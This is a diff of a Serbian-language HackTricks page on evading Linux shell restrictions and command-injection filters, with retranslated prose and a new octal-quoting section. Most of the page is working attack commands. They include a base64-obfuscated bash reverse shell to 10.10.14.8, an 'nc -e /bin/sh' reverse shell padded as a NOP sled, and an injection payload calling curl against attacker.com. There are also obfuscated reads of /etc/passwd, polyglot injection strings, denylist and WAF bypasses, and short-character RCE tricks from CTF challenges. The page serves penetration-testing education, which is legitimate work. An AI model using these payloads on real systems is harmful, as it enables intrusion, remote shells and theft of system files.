@@ -2,17 +2,22 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Uobičajena zaobilaženja ograničenja
+## Zaobilaženja uobičajenih ograničenja
 
-Kolekcije command-injection i WAF-evasion u PayloadsAllTheThings, Bo0oM-ov cheat sheet i dva povezana Secjuice članka pružaju kontekst za varijacije shell sintakse u ovom odeljku.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+Kolekcije za command-injection i WAF-evasion u PayloadsAllTheThings, Bo0oM-ov cheat sheet i dva povezana članka na Secjuice-u pružaju osnovu za varijacije shell sintakse u ovom odeljku.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+
+Za prepoznavanje shell sink-a i potvrdu slepog izvršavanja pogledajte [Command Injection](../../../pentesting-web/command-injection.md).
 
 ### Reverse Shell
+
 ```bash
 # Double-Base64 payload
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Kratak Rev shell
+
+### Kratki Rev shell
+
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -20,7 +25,9 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Zaobilaženje putanja i zabranjenih reči
+
+### Bypass putanje i zabranjene reči
+
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -80,7 +87,9 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
+
 ### Zaobilaženje zabranjenih razmaka
+
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -107,47 +116,73 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Zaobilaženje obrnute kose crte i kose crte
+
+### Zaobilaženje obrnute i obične kose crte
+
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Zaobilaženje cevi
+
+### Zaobilaženje pipe-ova
+
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Zaobilaženje pomoću hex kodiranja
+
+### Bypass pomoću hex encoding-a
+
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
 `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
+
+### Nazivi komandi bez slova uz oktalno citiranje
+
+Bash-ovo ANSI-C citiranje `$'...'` dekodira oktalne escape sekvence pri formiranju komandne reči.<sup>[[7]](#references)</sup>
+
+letter-denylist zato može da zakaže ako i dalje dozvoljava `$`, jednostruke navodnike, obrnute kose crte, cifre i separator komandi. Ovo ne zaobilazi ulaz prosleđen kao ispravno citiran argument podataka.<sup>[[13]](#references)</sup>
+
+U ovom lokalnom testu, `:` predstavlja prethodnu komandu, a `\151\144` se dekodira u `id`.<sup>[[7]](#references)</sup> Argumenti mogu biti kodirani kao zasebne reči kada je separator reči dostupan.<sup>[[13]](#references)</sup>
+
+```bash
+:;$'\151\144'
+```
+
 ### Zaobilaženje IP adresa
+
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Vremenski zasnovana eksfiltracija podataka
+
+### Eksfiltracija podataka zasnovana na vremenu
+
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Dobijanje znakova iz promenljivih okruženja
+
+### Dobavljanje znakova iz promenljivih okruženja
+
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Eksfiltracija DNS podataka
 
-Za out-of-band callback-ove, servis u stilu Collaborator-a, kao što je Burp Collaborator, može navesti ciljnu aplikaciju da komunicira sa spoljnim serverom; postojeći link ka [**pingb**](http://pingb.in) zadržan je kao istorijska navigacija, a ne kao tvrdnja o trenutnoj dostupnosti.<sup>[[6]](#references)</sup>
+### DNS eksfiltracija podataka
 
-### Builtins
+Za out-of-band callback-ove, servis poput Burp Collaborator može navesti ciljnu aplikaciju da komunicira sa spoljnim serverom; postojeća veza [**pingb**](http://pingb.in) zadržana je kao istorijska navigacija, a ne kao tvrdnja o trenutnoj dostupnosti.<sup>[[6]](#references)</sup>
 
-U ograničenoj ljusci, dostupni builtins predstavljaju preostalu površinu komandi za ove primere; Bash dokumentuje svoje builtin komande i gramatiku izvršavanja.<sup>[[7]](#references)</sup> Ideja potiče od [**devploit**](https://twitter.com/devploit).\
-Počnite od postojeće navigacije ka [**ugrađenim komandama ljuske**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), a zatim isprobajte sledeće tehnike specifične za Bash:<sup>[[7]](#references)</sup>
+### Ugrađene komande
+
+U ograničenoj shell ljusci, dostupne ugrađene komande predstavljaju preostale mogućnosti za ove primere; Bash dokumentuje svoje ugrađene komande i sintaksu izvršavanja.<sup>[[7]](#references)</sup> Ideja potiče od [**devploit**](https://twitter.com/devploit).\
+Počnite od postojeće navigacije do [**ugrađenih shell komandi**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), a zatim isprobajte sledeće tehnike specifične za Bash:<sup>[[7]](#references)</sup>
+
 ```bash
 # Get list of builtins
 declare builtins
@@ -199,26 +234,34 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
+
 ### Polyglot command injection
+
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Zaobilaženje potencijalnih regex-a
+
+### Zaobilaženje potencijalnih regex-ova
+
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
+
 ### Bashfuscator
 
-Sledeći poziv koristi Bashfuscator, open-source framework za obfuskaciju Bash-a; link ka repozitorijumu u komentaru koda zadržan je radi navigacije.<sup>[[8]](#references)</sup>
+Sledeća naredba koristi Bashfuscator, open-source framework za obfuskaciju Bash-a; link ka repozitorijumu u komentaru koda zadržan je radi navigacije.<sup>[[8]](#references)</sup>
+
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### RCE sa 5 karaktera
 
-Sledeća dva istorijska primera sa 5 karaktera zadržana su kao reprodukcije izazova: primarni repository izazova dostupan je na [repository-ju Orange Tsai-ja](https://github.com/orangetw/My-CTF-Web-Challenges), dok je drugi write-up link u code block-u navigacija čija trenutna dostupnost nije proverena.<sup>[[9]](#references)</sup>
+### RCE sa 5 znakova
+
+Sledeća dva istorijska primera sa 5 znakova zadržana su kao reprodukcije izazova: primarni repozitorijum izazova dostupan je na [repozitorijumu Orange Tsai-ja](https://github.com/orangetw/My-CTF-Web-Challenges), dok je druga write-up veza u bloku koda navigacija čija trenutna dostupnost nije proverena.<sup>[[9]](#references)</sup>
+
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -265,7 +308,9 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
+
 ### RCE sa 4 karaktera
+
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -300,52 +345,58 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Zaobilaženje Read-Only/Noexec/Distroless ograničenja
 
-Ako se nalazite unutar filesystem-a sa **read-only i noexec zaštitama**, ili u **distroless image-u**, okruženje nameće ograničenja izvršavanja dokumentovana u Linux `mount(8)` dokumentaciji i projektu Distroless; navedena stranica prikuplja tehnike za rad u okviru tih ograničenja.<sup>[[11]](#references)[[12]](#references)</sup>
+## Read-Only/Noexec/Distroless Bypass
+
+Ako se nalazite unutar fajl-sistema sa **zaštitama read-only i noexec** ili u **distroless image-u**, okruženje nameće ograničenja izvršavanja dokumentovana u Linux `mount(8)` i projektu Distroless; na povezanoj stranici navedene su tehnike za rad u takvim uslovima.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Zaobilaženje Chroot-a i drugih Jails okruženja
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Bash NOP Sled zasnovan na razmacima ("Bashsledding")
+## Space-Based Bash NOP Sled ("Bashsledding")
 
-Kada ranjivost omogućava delimičnu kontrolu argumenta koji na kraju dospeva do `system()` ili druge shell funkcije, pomeraj payload-a može biti neizvestan. Alan Cao i Will Tan opisuju ograničen slučaj na ugrađenom uređaju, gde je shell payload ubačen u memorijski mapirani NVRAM i prefiksovan razmacima.<sup>[[5]](#references)</sup>
+Kada ranjivost omogućava delimičnu kontrolu argumenta koji na kraju stiže do `system()` ili druge shell funkcije, pozicija payload-a može biti neizvesna. Alan Cao i Will Tan opisuju slučaj sa ograničenim ugrađenim uređajem, u kojem je shell payload upisivan u memorijski mapirani NVRAM, sa razmacima ispred njega.<sup>[[5]](#references)</sup>
 
-Zato možete kreirati *NOP sled za Bash* tako što ćete svoju stvarnu komandu prefiksovati dugim nizom razmaka ili tabulatora; Bash definiše razmake i tabulatore kao praznine koje razdvajaju reči u jednostavnoj komandi.<sup>[[5]](#references)[[7]](#references)</sup>
+Zato možete napraviti *NOP sled za Bash* tako što ćete ispred svoje stvarne komande dodati dugačak niz razmaka ili tabulatora; Bash definiše razmake i tabulatore kao prazne znakove koji razdvajaju reči u jednostavnoj komandi.<sup>[[5]](#references)[[7]](#references)</sup>
+
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ako ROP lanac (ili druga primitiva za korupciju memorije) prosledi pokazivač na komandni string koji počinje bilo gde unutar bloka razmaka, Bash može da parsira preostale početne razmake dok ne stigne do komande; u navedenom exploit-u rutera, ovo je omogućilo korišćenje neizvesnih pomeraja stringa.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Praktični slučajevi upotrebe na ograničenim embedded targetima uključuju:<sup>[[5]](#references)</sup>
+Ako ROP lanac (ili neki drugi primitiv za oštećenje memorije) prosledi pokazivač na string komande koji počinje bilo gde unutar bloka razmaka, Bash može da obradi preostale početne razmake dok ne naiđe na komandu; u navedenom exploit-u za ruter to je omogućilo upotrebu neizvesnih pomeraja stringa.<sup>[[5]](#references)[[7]](#references)</sup>
 
-1. **Memorijski mapirane konfiguracione blobove** (npr. NVRAM) kojima se može pristupiti iz više procesa.<sup>[[5]](#references)</sup>
-2. Kanale za payload u kojima napadač ne može da upisuje NULL bajtove radi poravnanja payload-a (opšta adaptacija problema poravnanja).<sup>[[5]](#references)</sup>
-3. Embedded uređaje sa malim BusyBox `ash`/`sh` okruženjem, koje BusyBox dokumentuje kao applet-e u sistemima sa ograničenim resursima.<sup>[[10]](#references)</sup>
+Praktični slučajevi upotrebe na ograničenim ugrađenim ciljnim sistemima uključuju:<sup>[[5]](#references)</sup>
 
-> 🛠️  Kombinujte ovu tehniku sa ROP gadgetima koji pozivaju `system()` u kontrolisanoj laboratoriji; navedeno istraživanje rutera demonstrira ovu kombinaciju na hardveru sa ograničenim resursima.<sup>[[5]](#references)</sup>
+1. **Blokovi konfiguracije mapirani u memoriju** (npr. NVRAM) kojima mogu da pristupaju različiti procesi.<sup>[[5]](#references)</sup>
+2. Kanali za payload u kojima napadač ne može da upiše NULL bajtove radi poravnanja payload-a (opšta prilagodba problema poravnanja).<sup>[[5]](#references)</sup>
+3. Ugrađeni uređaji sa skromnim okruženjem BusyBox `ash`/`sh`, koje BusyBox dokumentuje kao applet-e za sisteme sa ograničenim resursima.<sup>[[10]](#references)</sup>
+
+> 🛠️  Kombinujte ovu tehniku sa ROP gadget-ima koji pozivaju `system()` u kontrolisanoj laboratoriji; navedeno istraživanje rutera pokazuje ovu kombinaciju na hardveru sa ograničenim resursima.<sup>[[5]](#references)</sup>
+
+
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Tehnike za izbegavanje Web Application Firewall-a (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Tehnike za izbegavanje Web Application Firewall-a (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao i Will Tan — Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [3] [Tehnike zaobilaženja Web Application Firewall-a (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Tehnike zaobilaženja Web Application Firewall-a (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao i Will Tan — Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
+- [13] [Dojo CTF #36: tekstualni prikaz rešenja Shell Escape izazova — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
 {{#include ../../../banners/hacktricks-training.md}}
